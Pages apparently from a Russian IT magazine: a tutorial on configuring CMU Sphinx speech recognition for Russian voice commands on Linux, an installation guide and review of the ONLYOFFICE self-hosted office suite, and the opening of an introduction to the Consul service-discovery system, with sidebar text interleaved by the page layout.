К LINUX
В первой части нашего туториала мы рассмотрели
основные системы распознавания речи для Linux. Се-
годня попробуем применить их на практике. В экспе-
рименте участвовали: система распознавания речи
CMU Sphinx версии 4, ноутбук Dell Inspiron с ALT Linux
Кентавр 7.0.5 и микрофон Shure.





                             Сайт проекта CMU Sphinx — отсюда стоит начинать работу


НАЧАЛО
Меня очень вдохновило одно видео о создании умного
дома, где управление осуществлялось с помощью голо-
совых команд. В голове сразу появились идеи: установка
будильника голосовой командой непосредственно на теле-
фон, управление торрент-клиентом, прогноз погоды голо-
сом, последние новости, управление Smart TV голосом и т.        INFO
д. и т. п. Реальность оказалась куда прозаичнее и суровее.                                                                         Все действия
   Сразу о главном: современное состояние систем рас-      возможны только
познавания речи для Linux не позволяет в данный момент      в консоли! Пока нет
                                                                              достаточно удобногополноценно работать с компонентами умного дома. Осо-
                                                                         GUI для настройки
бенно все плохо с русским языком. Но кое-что все же уда-                                                          CMU Sphinx.
лось сделать.
   Начать следует, несомненно, с самого главного — установки и настрой-
ки системы распознавания речи. Я выбрал CMU Sphinx, поскольку это самый
«опенсорсный тру-вариант» из всех имеющихся на данный момент. К сожа-
лению, в Рунете крайне мало вменяемой документации по CMU Sphinx, разве
что несколько тем на русском форуме VoxForge. Англоязычная же документа-
ция, наоборот, достаточно подробно и детально описывает процесс установки
и настройки.
   Установим CMU Sphinx. Напомню, что она состоит из нескольких компонентов:
•  Pocketsphinx — библиотека распознавания, написанная на си;
•  Sphinxtrain — инструменты для работы с акустическими моделями;
•  Sphinxbase — библиотека для работы с двумя первыми компонентами;
•  Sphinx4 — собственно сама система распознавания речи, написанная
   на Java.

Определим также, что такое «акустическая модель» и «язы-
ковая модель». Акустическая модель позволяет оценить
распознавание речевого сегмента с точки зрения схожести
на звуковом уровне. Для каждого звука изначально строится
                                    WWWсложная статистическая модель, которая описывает произ-
несение этого звука в речи. Языковая же модель позволяет                                                                                      Короткая,
определить наиболее вероятные словесные последователь-     но емкая заметка
                                                                          об архитектурености. Сложность построения языковой модели во многом
                                                           CMU Sphinx
зависит от конкретного языка.
   Итак, скачиваем CMU Sphinx с официального сайта. В репозиториях боль-
шинства дистрибутивов Linux есть лишь безнадежно устаревшая ветка Sphinx3.
Поэтому будем собирать из исходников (проверь репозитории своего дистри-
бутива: в последних версиях Fedora и Ubuntu могут быть актуальные версии).
При необходимости вместо Pocketsphinx, написанного на cи, ты можешь ис-
пользовать Sphinx4, написанный на Java, подробности тут.
   Переходим в папку со скачанными архивами. Распаковываем их любым
удобным способом и запускаем процесс сборки. Если у тебя прямые руки, то
проблем возникнуть не должно:

# ./configure make
# checkinstall

И не забудь после установки выполнить

# ldconfig
Иногда возникает ошибка Failed to open audio device(/dev/dsp): No
such file or directory. Это значит, что поддержка OSS в ядре не включена.
Необходимо включить ее — смотри FAQ на сайте CMU Sphinx.





                                            Все получится, но не с первого раза...

ТЕСТИРУЕМ SPHINX
По умолчанию Sphinx предлагает нам проверить работу на базовом приме-
ре, а именно распознать фразу «go forward ten meters». Воспользуемся ути-
литой пакетного распознавания pocketsphinx_batch. В составе Sphinx также
есть инструмент распознавания речи с микрофона pocketsphinx_continuous
(синтаксис ее схож с pocketsphinx_batch). Для удобства работы лучше всего
использовать отдельную директорию. Синтаксис команды таков:

# pocketsphinx_batch -argfile argfile 2>./errors

argfile — это имя файла в текущей директории, содержащего все аргументы.
Также мы используем стандартную утилиту stderr для удобства перенаправле-
ния вывода. Вот содержимое нашего файла argfile:

-hmm /usr/local/share/pocketsphinx/model/hmm/en_US/hub4wsj_sc_8k
-lm /usr/local/share/pocketsphinx/model/lm/en/turtle.DMP
-dict /usr/local/share/pocketsphinx/model/lm/en/turtle.dic
-cepdir /home/saint/sphinx
-ctl ctlfile
-cepext .raw
-adcin true
-hyp outname

Значение строк файла следующее:
• -hmm — путь к директории, содержащей файлы акустической модели (ша-
   блоны отдельных звуков);
•  -lm — путь к файлу триграммной языковой модели. Можешь почитать про это;
•  -dict — путь к файлу словаря произношения;
•  -cepdir — путь к каталогу со звуковыми файлами;
•   -ctl — файл с именами обрабатываемых файлов. Файл goforward.raw мы
   возьмем из комплекта исходников Pocketsphinx;
•  -cepext — расширение обрабатываемых файлов;
•  -adcin — указатель принадлежности обрабатываемого файла к raw;
•  -hyp — имя файла, в который будет выводиться распознанный текст.

Аргументы с путями к файлам моделей необходимо указывать обязательно. Пом-
ни, что многие параметры заданы по умолчанию (смотри man stderr (1)). По-
этому для работы с файлом *.raw необходимо принудительно указать расшире-
ние, иначе будет использован параметр по умолчанию — расширение mfc, а таких
файлов у нас в базовом примере, естественно, нет — будут возникать ошибки.
  В итоге исполнения у нас в файле outname будет следующее содержимое:

go forward ten meters (goforward -26532)

Параллельно можешь глянуть, откомпилировать и запу-
стить в директории с файлом goforward.raw аналогич-
ную программу, написанную на си разработчиками CMU                                                WARNING
Sphinx. Вот инструкция. Я же решил не мудрствовать лука-
во и воспользовался для записи консольной утилитой Sox       Если ты вносишь
(есть практически во всех дистрибутивах). Записывать звук         -cepdir в файл
                                                                                   аргументов, то
будем следующим образом (предварительно изучив man):                                                                         сокращенный
                                                                                      путь ~/sphinx
$ rec -r 16k -e signed-integer -b 16                             обрабатывается
                                                                                 неправильно:    -c 1 filename.wav                                                                             приходится писать
                                                                       полный путь. Если ты
Прерывание записи по <Ctrl + C>. У меня Sox при этом ругал-     будешь прописывать
                                                                                аргумент послеся на невозможность использования частоты дискретизации:
                                                                           команды, то можешь
                                                                                 использовать
Can’t set sample rate 16000; using 48000                     сокращенный путь!
На самом деле это не так — все в порядке с частотой дискретизации.





                                                           Обучаем CMU Sphinx

АДАПТАЦИЯ ЗВУКОВОЙ МОДЕЛИ
Адаптация звуковой модели — это попытка улучшить распознавание для кон-
кретного голоса, произношения, акцента или окружающей среды. Создаем
в отдельной директории файлы arctic20.fileids и arctic20.transcription.
Скачать пример можно отсюда. Далее необходимо надиктовать английские
предложения из файла arctic20.txt по следующей схеме: arctic_0001.
wav...arctic_0020.wav, то есть по одному файлу на предложение. Для упро-
щения записи я воспользовался скриптом:





А чтобы прослушать полученное, выполнил


Далее скопируем акустическую модель (с которой мы и работали) из /usr/
local/share/pocketsphinx/model/hmm/en_US/hub4wsj_sc_8k в нашу рабо-
чую директорию. Создадим файлы акустических особенностей (внимание: ра-
бота идет в директории с файлами *.wav):
# sphinx_fe -argfile hub4wsj_sc_8k/feat.params -samprate 16000
    -c arctic20.listoffiles -di . -do . -ei wav -eo mfc -mswav yes

В результате получаем файлы *.mfc. Скачиваем с сайта дополнительный па-
кет, из которого вытаскиваем файл под названием mixture_weights, располо-
женный в /usr/local/share/pocketsphinx-extra/model/hmm/en_US/hub4_
wsj_sc_3s_8k.cd_semi_5000, и помещаем его в директории с акустической
моделью. Также необходимо конвертировать mdef-файл акустической модели
в текстовый формат:

# pocketsphinx_mdef_convert -text hub4wsj_sc_8k/mdef
    hub4wsj_sc_8k/mdef.txt

Соберем накопленные данные. Скопируем  утилиту bw из /usr/local/
libexec/sphinxtrain/bw в рабочий каталог (перед этим не забудем устано-
вить Sphinxtrain!):

# ./bw -hmmdir hub4wsj_sc_8k -moddeffn hub4wsj_sc_8k/mdef.txt
    -ts2cbfn .semi. -feat 1s_c_d_dd -svspec 0-12/13-25/26-38
    -cmn current -agc none -dictfn arctic20.dic
    -ctlfn arctic20.fileids -lsnfn arctic20.transcription -accumdir

Запускаем bw и видим:

SYSTEM_ERROR: “corpus.c”, line 339: Unable to open
arctic20.fileids for reading: No such file or directory

Мне очевидно, что правая рука у разработчиков не ведает, что творит левая
(про неактуальность части документации я уже не говорю). Решается пробле-
ма просто: переименовываем в рабочем каталоге файл arctic20.listoffiles
в arctic20.fileids. Вот теперь все работает. Адаптация закончена. Это один
из самых сложных этапов, и от его успешного выполнения зависит дальнейшая
наша работа. Получится все, но не сразу.
  Для записи звуковых файлов лучше всего подходит Audacity — у этого
приложения самый большой арсенал функций, и оно умеет работать с raw-
файлами.
                           Одна из немногих неконсольных программ в нашей работе


ТЕСТИРОВАНИЕ АДАПТАЦИИ
Суть такова: мы запишем несколько образцов, на которых оригинальная аку-
стическая модель спотыкается, и обработаем их с помощью адаптированных
акустических моделей. Создадим в рабочей директории поддиректорию test,
а в ней — поддиректорию wav, в которой будут наши тестовые записи. Прове-
ряем работу. Помни, что адаптация не приведет к стопроцентно верному ре-
зультату: адаптированные модели будут точно так же ошибаться; плюс в том,
что они будут делать это реже. Мои вполне наглядные записи были сделаны
далеко не с первой попытки: было достаточно записей, где ошибались все мо-
дели. Попробуем распознавание с помощью базовой модели:

# pocketsphinx_batch
    -hmm /usr/local/share/pocketsphinx/model/hmm/en_US/hub4wsj_sc_8k
    -lm /usr/local/share/ pocketsphinx/model/lm/en/turtle.DMP
    -dict /usr/local/share/pocketsphinx/model/lm/en/turtle.dic
    -cepdir wav -ctl adaptation-test.fileids -cepext .wav
    -adcin yes -hyp adaptation-test.hyp
Результат:

hello halt say forty (test1 -27391)
go forward ten meter (test2 -35213)
hall doing home (test3 -30735)

Как можно убедиться, результат полностью идентичен записи. Адаптация ре-
ально работает!

РУССКИЙ ЯЗЫК В POCKETSPHINX
Прикрутим наконец русский язык к нашему Сфинксу. Качаем русские модели,
созданные ребятами из проекта VoxForge. Скачать нужно все четыре файла.
Голосовое управление будет на русском, а значит, нам нужны собственная язы-
ковая модель и собственный словарь (скорее всего, части наших слов в рас-
пространенных примерах не будет). Для этого мы создадим свою акустическую
модель, воспользовавшись этой инструкцией. Создавать все будем с помо-
щью утилиты CMUCLMTK. Скачиваем c сайта Sphinx, собираем из исходников.
   Для начала создадим текстовый файл с предложениями для нашей языко-
вой модели:
Далее создадим словарный файл:

# text2wfreq <lmbase.txt | wfreq2vocab> lmbase.tmp.vocab
# cp lmbase.tmp.vocab  lmbase.vocab

И языковую модель:

# text2idngram -vocab lmbase.vocab -idngram lmbase.idngram < lmbase.txt
# idngram2lm -vocab_type 0 -idngram lmbase.idngram
    -vocab lmbase.vocab -arpa lmbase.arpa

И DMP-модель:

# sphinx_lm_convert -i lmbase.arpa -o lmbase.lm.DMP

Создаем собственный словарь. Скачиваем с GitHub утилиты:

# git clone https://github.com/zamiron/ru4sphinx/имя_твоей_папки

Переходим в каталог /home/имя_твоей_папки/text2dict и создаем там тек-
стовый файл my_dictionary со списком слов (каждое новое слово — с нового
абзаца). Вот пример my_dictionary:
Затем выполняем:

# perl dict2transcript.pl my_dictionary my_dictionary_out

Словарь создан! Далее попробуем распознавать слова, присутствующие в сло-
варе (в нашем примере их немного). Не забудь указать в аргументах собствен-
ную языковую модель и словарь — все должно работать. При желании можно
произвести адаптацию акустической модели.





                 Самое сложное — создание словаря и акустической модели — позади!


РЕАЛИЗАЦИЯ ГОЛОСОВОГО УПРАВЛЕНИЯ
Главной нашей целью не была реализация крутого интерфейса управления,
здесь все будет очень примитивно. Главное, чтобы все работало. Действовать
будем следующим образом:
1. Пишем команду, распознаем ее.
2. Передаем распознанный текст в файл, в соответствии с ним выполняем ко-
   манду.

В качестве тестовых команд будем использовать уменьшение и увеличение
громкости звука. Почитав мануал к Sox, я решил оканчивать запись по исте-
чении секунды тишины с порогом тишины в 3,8% (порог явно сугубо индиви-
дуальное значение и зависит от твоего микрофона и окружающей обстанов-
ки). К сожалению, я не нашел в pocketsphinx_batch параметр вывода только
для распознанных слов, поэтому я воспользуюсь инструментом sed:

# cat ~/sphinx/rus/outname | sed ‘s/\( (.*\)//’

Это удалит из строки вида наша команда (audio -4023) пробел перед от-
крывающей скобкой, ее саму и все последующее содержимое. В результате
мы получим строку вида наша команда, что нам и нужно. Также в Сети нашелся
скрипт для упрощения работы с Sox:





Скрипт в ответ на команды «Тише» или «Громче» выполняет соответствующие
действия с сигнализацией через notify-send. К сожалению, работать он будет
только при запуске из терминала (иначе звук не пишется). Впрочем, представле-
ние о голосовом управлении он дает (возможно, ты предложишь лучший метод).

САМОЕ СЛОЖНОЕ — ПОЗАДИ
Сегодня мы рассмотрели способ установки и настройки CMU Sphinx для ра-
боты с русской речью. В следующей статье будем заниматься самым интерес-
ным — создадим некое подобие умного дома на основе наших наработок. Это
не идеальный и уж точно не самый простой из доступных вариантов. Но этот
вариант дает наибольшее представление о принципах работы CMU Sphinx.
 SYNACK
ОБЛАЧНЫЙ
ОФИС:
УДАР ПО
MS OFFICE 365
ОФИС В ОБЛАКАХ
И НА ЛИЧНЫХ СЕРВЕРАХ


                                                             Александр «Plus» Рак
                                                                         plus@omsklug.com
                                                                            Участник сообщества
                                                                OmskLUG. Руководитель
                                                                        группы автоматизации
                                                                          отдела ИТ департамента
                                                                        образования города
                                                                           Салехарда
Сегодня облачными технологиями уже никого не уди-
вишь. На просторах интернета можно найти колос-
сально большое количество таких решений. Чего
только стоит нашумевший MS Office 365. Mail.Ru —
один из первых, кто подключил его API для своих по-
чтовых сервисов. И все бы ничего, если бы проект
Teamlab не переименовался и не переориентиро-
вался на open source! Теперь этот проект известен
как ONLYOFFICE, и его можно использовать свободно!
Ребята из ONLYOFFICE теперь позиционируют свой
продукт как универсальный облачный офис, позволя-
ющий управлять почтой, документами, проектами, ко-
мандой и прочим в едином пространстве. Для работы
с сервисом нужен только браузер, еще можно завести
XMPP-клиент (серверная часть XMPP встроена в сер-
верный дистрибутив ONLYOFFICE).

Что касается платности, в этом проекте можно купить подписку на техническую
поддержку (это стало модно в серьезных IT-решениях, где все работает из ко-
робки). Причем если на портале в разделах пять активных пользователей, то
техническую поддержку тебе окажут совершенно бесплатно. Также есть воз-
можность развернуть ONLYOFFICE на облаке проекта, цена в этом случае так-
же зависит от числа пользователей портала. Серверная платформа доступна
для развертывания в нескольких вариантах:
1. Серверная версия Enterprise Edition.
2. Установка серверной версии Free Edition с помощью сценария автоматиче-
   ской установки.
3. Community Server — собственно портал.
4. Document Server — сервер обработки документов.
5. Mail Server.

Итак, по порядку. Серверную часть  Enterprise  Edition можно установить
для Docker или скачав и развернув один из трех доступных образов виртуаль-
ных машин: MS Hyper-V, VMware и VirtualBox. Образы можно скачать с офици-
ального сайта. При таком варианте установки потребуется немало аппаратных
ресурсов, что не очень радует. Системные требования:
•  процессор двухъядерный с тактовой частотой 2 ГГц или лучше;
•  оперативная память не менее 6 Гбайт;
•  свободное место на жестком диске не менее 40 Гбайт.

И требования к программному обеспечению:
•  Microsoft Hyper-V: версия 6.1 или выше;
•  VMware: VMware vSphere Hypervisor и VMware vSphere Client версии 5.0 или
   выше;
•  VirtualBox: версия 5.0 или выше.
  Даже для виртуалок ONLYOFFICE весьма прожорлив.

Система автоматической установки чуть менее прожорлива,
при этом включает в себя весь необходимый набор функций:
Community Server, Document Server и Mail Server. Системные
требования:                             WWW
•  оперативная память: не менее 6 Гбайт;
                                                                       Официальный•  процессор: двухъядерный 2 ГГц или выше;                                                                                сайт ONLYOFFICE
•  файл подкачки: не менее 3 Гбайт;
•  свободное место на жестком диске: не менее 40 Гбайт;        Серверная вер-
                                                                               сия Enterprise•  дистрибутив: 64-битный Red Hat, CentOS или другой со-
                                                                                                  Edition (Docker
   вместимый дистрибутив с версией ядра 3.19 или выше,                                                                             или образы вир-
   64-битный Debian, Ubuntu или другой совместимый дис-     туальных машин)
   трибутив с версией ядра 3.19 или выше.

Установка в этом режиме обычно не вызывает большого количества вопросов:
просто по очереди выполняй скрипты. Возможна и автоматическая установка
с помощью сценария установки.
  Нас интересует исключительно ручная установка нужных компонентов,
по двум причинам. Во-первых, она позволяет выборочно устанавливать необхо-
димые модули. Например, если в твоей инфраструктуре уже есть почтовый сер-
вер, зачем ставить еще один, когда можно подключить просто почтовый акка-
унт. Экономия ресурсов и времени, ну и, в конце концов, развернуть — это одно
дело, потом это же еще надо обслуживать. Во-вторых, таким образом можно
достичь наибольшей гибкости установки. Например, один модуль (Community
Server) можно поставить локально на сервер, устанавливая все зависимости,
а другой (Document Server) — запустить в Docker. Также присутствует версия
для Windows. Здесь, как обычно, все просто: скачали EXE-файл, запустили, да-
лее, далее, далее, готово. По пути задаем настройки. Мы же рассмотрим уста-
новку на примере одного из модулей (Document Server) на Debian 8.2. Установ-
ка остальных модулей аналогична. В некоторых случаях модули лучше держать
на разных серверах. Так, если есть необходимость иметь несколько порталов,
можно завести их на один
Document Server. На офици-
альном сайте в каждом раз-
деле присутствуют видеома-
нуалы.
   Итак, дано:
1. Виртуалка или железяка
   с Debian 8.2 или Ubuntu
   14.04 LTS на борту, дву-
  мя гигами памяти и 10
   Гбайт свободного места
   на диске.
2. Настроена сеть, установ-
   лены последние обнов-
   ления.

УСТАНОВКА
И НАСТРОЙКА
Все описанное также до-
ступно  на  официальном
сайте проекта: инструкция                               Document Server
по  установке  серверной
версии  Document   Server
для Linux на локальном сервере. Итак, первым делом добавляем все необхо-
димые ключи и подключаем репозитории.

# apt-key adv --keyserver keyserver.ubuntu.com
    --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
# echo “deb http://download.mono-project.com/repo/debian
    wheezy/snapshots/3.12.0 main” | sudo tee
    /etc/apt/sources.list.d/mono-xamarin.list
# echo “deb http://archive.ubuntu.com/ubuntu precise main
    universe multiverse” | sudo tee -a /etc/apt/sources.list
# add-apt-repository ppa:ubuntu-toolchain-r/test
# wget http://download.onlyoffice.com/repo/onlyoffice.key
    && sudo apt-key add onlyoffice.key
# echo “deb http://download.onlyoffice.com/repo/debian
    squeeze main” >> /etc/apt/sources.list
# apt-get update && sudo apt-get upgrade
# apt-get install onlyoffice-documentserver
Вот так нехитро устанавливается модуль Document Server. После этого он бу-
дет доступен по IP-адресу хоста, на котором установлен. Уже можно загрузить
документ и редактировать его.
  По умолчанию сервис работает по HTTP, для запуска по HTTPS необходимо
сгенерировать закрытый ключ и SSL-сертификат. И подсунуть в каталоги.

# mkdir -p/opt/onlyoffice/Data/certs
# cp onlyoffice.key /opt/ onlyoffice/Data/certs
# cp onlyoffice.crt /opt/ onlyoffice/Data/certs/
# cp dhparam.pem /opt/onlyoffice/Data/certs/
# chmod 400 /opt/onlyoffice/Data/certs/onlyoffice.key

Переходим   к   установке
Community Server. Как я пи-
сал выше, тот модуль выне-
сем на отдельную виртуалку
с рабочим диском, напри-
мер, в 100 гигов. Устанавли-
вать будем Community Server
для Linux на локальном сер-
вере. Инструкция по уста-
новке  серверной  версии
Community Server с офици-
ального сайта.
   Сначала     посмотрим
на системные требования:
•  процессор двухъядер-
  ный с тактовой частотой
   2 ГГц или лучше;
•  оперативная память
   не менее 2 Гбайт;
•  свободное место
   на жестком диске не ме-
                                 Онлайн-редактор ONLYOFFICE
   нее 2 Гбайт;
•  дополнительные  требо-
   вания не менее 2 Гбайт для файла подкачки;
•  операционная система 64-битный дистрибутив Red Hat, CentOS или другой
   совместимый дистрибутив с версией ядра 3.8 или выше, 64-битный дистри-
   бутив Debian, Ubuntu или другой совместимый дистрибутив с версией ядра
   3.8 или выше.
Дополнительные требования:
•  Mono: версия 3.2 или выше;
•  MySQL: версия 5.5 или выше;
•  nginx.

Дано:
1. Виртуалка или железяка с Debian 8.2 или Ubuntu 14.04 LTS на борту, двумя
   гигами памяти и 100 Гбайт свободного места на диске.
2. Настроена сеть, установлены последние обновления.

Добавляем ключи и подключаем репозитории:

# wget http://download.onlyoffice.com/repo/onlyoffice.key
    && sudo apt-key add onlyoffice.keys
# deb http://download.onlyoffice.com/repo/debian squeeze main
# apt-get update
# apt-get install onlyoffice-communityserver

Перед первым запуском необходимо создать базу данных и настроить подклю-
чение к ней. Так же как и Document Server, Community Server по умолчанию ра-
ботает по HTTP, для работы по HTTPS необходимо сгенерировать и подсунуть
ключ и сертификаты. Кстати, если ты совсем параноик в части безопасности, то
здесь можно ограничить доступ, используя авторизацию по SSL nginx. Далее
необходимо подружить Community Server и Document Server. Для этого захо-
дим на портал. Итак, почти из коробки нам доступно:
•  управление проектами;
•  документами;
•  CRM;
•  люди (команда пользователей);
•  сообщество (ведение блогов, новостей, событий, приказы, опросы и прочее);
•  почта (почтовый веб-клиент);
•  чат (веб-клиент XMPP, предусмотрено использование внешнего IM-клиен-
    та, на странице есть рекомендации по внешним XMPP-клиентам);
•  календарь;
•  лента новостей портала.
  Лента новостей портала

Первое: замечаем фишку подключения внешних аккаунтов, среди них Owncloud.





  Документы портала
Подключение аккаунта Owncloud очень простое.





  Подключение Owncloud-аккаунта


Ссылку для аккаунта Owncloud можно добыть, зайдя в Owncloud: начиная с вер-
сии 7+ слева внизу есть шестеренка, жмем на нее и копируем ссылку, под кото-
рой написано «Используйте этот адрес для доступа к файлам через WebDAV».
После этого у тебя появится папочка с заданным именем. Можно подключать
несколько Owncloud-аккаунтов с разных серверов одновременно. Каталоги,
как и документы, будут создаваться на сервере Owncloud.
  При создании документов доступны основные форматы: документ, презен-
тация и таблица. Все документы, помимо PDF, могут конвертироваться в любой
офисный формат:
•  DOCX, ODT, HTML, TXT — для документов;
•  XLSX, ODS, HTML, CSV — для таблиц;
•  PDF, PPTX — для презентаций.

Если что-то удалил по ошибке, есть корзина, из которой можно все вернуть.
Кроме того, есть возможность просмотра документа по версиям. В разделе
управления проектами все так же просто и удобно. Можно создавать проекты,
внутри — задачи, а внутри задач — подзадачи. Привязывать к ним документы,
которые появятся в разделе документов «Документы проекта». Все это можно
наносить на календарь, который, в свою очередь, расшаривать как пользова-
телям, так и группам портала. Также вести обсуждения, строить отчеты, вести
учет времени и многое другое.
  Раздел «Проекты»

В разделе «CRM» все как полагается для ведения базы клиентов. Тут и компа-
нии, и персоны, внутри которых можно создавать проекты и задачи. Назначать
ответственных, контролировать сделки, выставлять счета, назначать меропри-
ятия, все это выгружать на свой сводный или общий календарь. Одним сло-
вом — этот раздел хорошо подходит для организаций, ведущих коммерческую
деятельность. К слову, о счетах: сейчас ведутся разработки по интеграции все-
го этого комплекса с 1С. На официальном форуме поиском уже можно найти
ветки общения с разработчиками по поводу выгрузки документов.
   Переходим в раздел «Сообщество». Здесь все просто как дважды два —
каждый пользователь может вести свой блог. Дальше — раздел «Люди». В этом
разделе можно создавать сотрудников, высылая инвайты им на электронную по-
чту, по которым они регистрируются на портале. Все это можно делить на груп-
пы, организации, клиентов и партнеров. Также можно импортировать списки
из сервисов Yahoo, Google или из файла. Далее раздел «Почта». Здесь можно
подключать любые почтовые учетные записи, управлять метками. Удобным по-
казалось отображение всех входящих писем единым списком, отдельно также
можно отображать по каждой учетной записи. Чат, как уже говорилось ранее,
построен на XMPP-протоколе. Портал имеет встроенный веб-клиент.
  Последним посмотрим раздел с настройками. Здесь сразу можно сменить
логотип, задать языковые настройки и настройки времени. Задать FQDN пор-
тала. Выбрать шаблон команды — как будут классифицироваться пользовате-
ли и группы. И последним можно выбрать цветовую схему из шести вариантов.
Настройки безопасности включают в себя доступ к порталу: политика паролей,
настройка почтовых доменов пользователей, которым разрешено регистри-
роваться, ограничения по IP-адресу, настройки обращений к администратору.
Нельзя не сказать, что последняя функция очень полезна :). В правах доступа
можно настраивать доступ к модулям системы. Например, одним разрешить
только документы, другим только календарь и проекты. В подразделе управ-
ления данными можно отключить портал или удалить его совсем. Очень инте-
ресный подраздел «Интеграция». Здесь можно подключать внешние сервисы
к порталу, как облака, так и некоторые социалки! И если с Owncloud все про-
сто, то с Google-дисками нужно повозиться. Первым делом нужно подключить
Google API. Для этого:
•  перейди в консоль API Google;
•  введи свои регистрационные данные, если это необходимо;
•  нажми кнопку Create project (Создать проект). Откроется новое окно. Введи
  имя проекта в поле Project name и нажми кнопку Create (Создать). Ты будешь
   перенаправлен на страницу Dashboard со сводной информацией о создан-
  ном проекте;
•  перейди к разделу Use Google APIs (Использование API Google) и нажми
   на ссылку Enable and manage APIs (Включение и управление API). Откроется
   обзорная страница API Manager;
•  в разделе Google Apps APIs нажми на ссылку Drive API, а затем на кнопку
   Enable API (Включить API);
•  вернись на страницу Google APIs, перейди к разделу Social APIs, нажми
   на ссылку Google+ API, а затем на кнопку Enable API (Включить API);
•  на левой боковой панели перейди в раздел Credentials (Учетные данные),
   разверни список Add credentials (Добавить учетные данные) и выбери оп-
  цию OAuth 2.0 client ID (Идентификатор клиента OAuth 2.0);
•  нажми кнопку Configure consent screen (Настройка экрана подтверждения)
   и укажи имя твоего проекта в поле Product name shown to users (Имя продук-
    та, которое видят пользователи). Нажми кнопку Save (Сохранить). Откроет-
   ся раздел Create client ID (Создание идентификатора клиента);
•  в списке Application type (Тип приложения) выбери переключатель Web
   application (Веб-приложение);
•  в поле Authorized redirect URIs (Авто-
   ризованные URI переадресации) вве-
   ди  https://service.teamlab.com/
   oauth2.aspx;
•  нажми кнопку Create (Создать);
•  Client  ID  (идентификатор  клиента)
   и Client secret (секретный код клиента)
   будут отображены в новом окне. Ско-
   пируй или запиши их.

После пары несложных трюков у всех    После настройки Google API, воз-
пользователей доступна кнопка подклю-    можность подключения Google Drive
чения учетной записи Google Drive. Процесс хорошо описан на официальном
сайте: инструкция по подключению внешних учетных записей.
  Там же можно найти инструкции, как подключать сервисы Facebook, Twitter,
LinkedIn, Dropbox и OneDrive.

ИТОГО
Подведем итоги. Команда ONLYOFFICE очень и очень удивляет после ребрен-
динга своего продукта. Начиная от развертки и до конечного использования
процесс простой и в то же время комфортный. Не будем забывать о наших
«верхах», которые думают о нас днем и ночью. Например, поднимая корпора-
тивный портал на своих локальных серверах, IT-специалист действует полно-
стью в рамках закона № 97-ФЗ от 5 мая 2014 года ;). От себя лично скажу, что
ONLYOFFICE достаточно крутой продукт, способный конкурировать с подоб-
ными системами СЭД. Команда разработчиков сильно потрудилась над каждой
мелочью. Весьма рекомендую к использованию.
   P. S. Немного видеоматериалов по работе с ONLYOFFICE, найденных в Сети:
•  Идеальный день с ONLYOFFICE
•  Совместная работа с ONLYOFFICE — проще не бывает!
•  Альтернатива MS Office Online
SYNACK
ADVERSUS
EA CONSUL
RESPONDIT        ЗНАКОМИМСЯ
        С СИСТЕМОЙ
         ОБНАРУЖЕНИЯ
         СЕРВИСОВ CONSUL





                                           Мартин
                                                         «urban.prankster»
                                            Пранкевич
                                                prank.urban@gmail.com
Сегодняшние сети нельзя назвать статичными. Рас-
пределенные системы, облачные сервисы, системы
виртуализации и микросервисы привели к тому, что
управлять при помощи традиционных инструментов
становится невозможно. Серверы могут переме-
щаться, сервисы появляются и отключаются. Вручную
отследить очень сложно. На выручку придут системы
обнаружения сервисов (Service Discovery), предлага-
ющие дополнительные возможности для управления
инфраструктурой.



ВОЗМОЖНОСТИ CONSUL
Можно хранить информацию о расположении служб в конфигурационных фай-
лах или использовать DNS, но это не очень подходит в динамической среде или
при запуске микросервисов. Если служба выйдет из строя и окажется необ-
ходимым быстро подключиться к другому серверу, будут возникать задержки.
Системы обнаружения сервисов автоматизируют процесс, позволяя получить
ответ на вопрос, где работает нужный сервис, и изменить настройки в случае
появления нового или отказа. Обычно под этим подразумевают набор сете-
вых протоколов (Service discovery protocols), обеспечивающих нужную функ-
цию, хотя в современных реализациях это уже часть архитектуры, позволяю-
щей обнаруживать связанные компоненты. На сегодня существует несколько
решений, реализующих хранение информации об инфраструктуре, — как от-
носительно сложных, использующих key/value-хранилище и гарантирующих до-
ступность (ZooKeeper, Doozer, etcd), так и простых (SmartStack, Eureka, NSQ,
Serf). Но, предоставляя информацию, они не слишком удобны в использовании
и сложны в настройках.
   Consul, разработанный в HashiCorp, также известной своими инструмента-
ми вроде Vagrant и Packer, вобрал лучшее, что есть у аналогов. При этом он
очень прост в развертывании, может легко масштабироваться на несколько да-
та-центров, дружественен в использовании и поддержке, что делает его иде-
альным для современных инфраструктур. К тому же он мультисистемный. В от-
личие от многих подобных решений, он работает на Windows, OS X, FreeBSD,
Solaris и Linux.
   Consul предоставляет ряд функций, обеспечивающих доступность инфор-
мации об инфраструктуре. Service Discovery позволяет обнаружить сервисы
и заносить их в базу, называемую каталогом. Любые приложения, использую-
щие Consul, обращаются к нему через localhost, то есть приложению не нужно
знать, где хранятся данные, Consul все берет на себя. Для поиска предлагается
API, реализованный через HTTP и DNS. Последний вариант дает возможность
работать с Consul приложениям, которые о нем ничего не знают. Поддержи-
вается два вида DNS-запроса: поиск узлов (node lookups) и сервисов (service
lookups).

<node>.node[.datacenter].<domain>
[tag.]<service>.service[.datacenter].<domain>

Как видим, в запросе также можно конкретизировать дата-центр и, используя
тег, указать нужный тип сервиса/узла. В случае если запросу соответствует не-
сколько IP, они возвращаются случайным образом, чем обеспечивается про-
стая балансировка нагрузки.
   Служба регистрируется при помощи установки агента и настройки его па-
раметров или через HTTP API. Последний вариант позволяет регистрировать
любой внешний сервис, не принадлежащий дата-центру.
   Установленные агенты собирают более 200 метрик и могут предоставлять
любое количество проверок состояния системы и сервиса, которое необходи-
мо. Администраторы самостоятельно определяют правила проверок. Получен-
ная информация может быть использована для мониторинга, и Consul вполне
заменяет системы мониторинга вроде Nagios. Обнаружив проблему с серви-
сом, Consul автоматически перенаправляет запрос к другому работающему
узлу. При этом реализовано два сценария. Если узел уведомляет Consul, что он
выключается и будет недоступен (left), его сервисы и проверки удаляются из ка-
талога. Однако когда узел или сервис пропадает без предупреждения (failed),
он помечается как критический, но информация некоторое время в каталоге
сохраняется, а Consul пытается периодически проверить его доступность.
   Также Consul реализует иерархическое key/value-хранилище, которое мо-
жет быть использовано для любых целей: динамической конфигурации, обме-
на данными, маркировки, координации доступа к сервисам, выбора лидера
и так далее. Доступ к данным производится при помощи HTTP API. Тут нужно
отметить, что Consul скорее не заменяет, а дополняет средства конфигурации
вроде Puppet и Chef.
   Написан на Go и доступен под Mozilla Public License 2.0.

АРХИТЕКТУРА CONSUL
Построен Consul по клиент-серверной схеме, использована децентрализован-
ная архитектура. Агенты устанавливаются на все узлы Consul, позволяют ими
управлять, обнаруживают сервисы, собирают данные о состоянии, реализу-
